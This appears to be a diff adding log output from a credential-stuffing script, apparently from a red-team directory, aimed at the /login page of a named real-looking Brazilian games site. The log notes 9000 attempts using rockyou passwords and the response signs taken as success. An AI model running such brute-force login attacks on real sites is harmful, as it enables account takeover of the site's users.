@@ -1,0 +1,4 @@
+/home/ubuntu/red-team-operator/desapegogames.com.br/enum/pivot_login_credstuff_rockyou.py:30: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  ts=datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
+2026-09-05T00:43:55Z [*] PIVOT /login cred stuffing — 9 users x 1000 passes = 9000 tentativas (rockyou top1000)
+2026-09-05T00:43:55Z [*] Sucesso = HTTP 302/303 OU body sem 'nao confere' + cookie ci_session set
